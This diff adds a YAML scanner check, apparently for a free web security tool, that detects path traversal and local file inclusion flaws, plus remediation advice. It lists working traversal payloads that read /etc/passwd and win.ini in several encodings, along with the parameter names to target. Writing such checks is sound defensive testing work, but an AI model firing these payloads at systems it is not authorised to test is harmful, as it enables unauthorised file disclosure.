@@ -1,0 +1,61 @@
+# Path traversal detection
+#
+# Active check — injects directory traversal payloads and checks
+# for OS-file content in responses.
+
+metadata:
+  name: Path traversal / Local File Inclusion
+  description: >
+    Tests parameters for directory traversal vulnerabilities by
+    injecting dot-dot-slash sequences with various encodings and
+    checking for OS-specific file content in responses.
+  author: BurpFree
+  version: "1.0"
+  tags: [active, path-traversal, lfi, injection]
+
+severity: high
+confidence: firm
+type: active
+
+target_params:
+  - file
+  - path
+  - page
+  - template
+  - include
+  - doc
+  - folder
+  - root
+  - dir
+  - filename
+
+payloads:
+  - value: "../../../etc/passwd"
+    description: "Basic traversal (Linux)"
+    match_body: "root:x:0:0"
+
+  - value: "..%2f..%2f..%2fetc%2fpasswd"
+    description: "URL-encoded traversal"
+    match_body: "root:x:0:0"
+
+  - value: "....//....//....//etc/passwd"
+    description: "Double-dot bypass"
+    match_body: "root:x:0:0"
+
+  - value: "..\\..\\..\\windows\\win.ini"
+    description: "Backslash traversal (Windows)"
+    match_body: "[fonts]"
+
+  - value: "/etc/passwd"
+    description: "Absolute path"
+    match_body: "root:x:0:0"
+
+  - value: "file:///etc/passwd"
+    description: "File protocol traversal"
+    match_body: "root:x:0:0"
+
+remediation: >
+  Validate and sanitize file paths against an allowlist of permitted
+  directories. Use path canonicalization to resolve traversal sequences
+  before access. Never use user input directly in file operations.
+  Consider chroot jails or containerization for file access isolation.
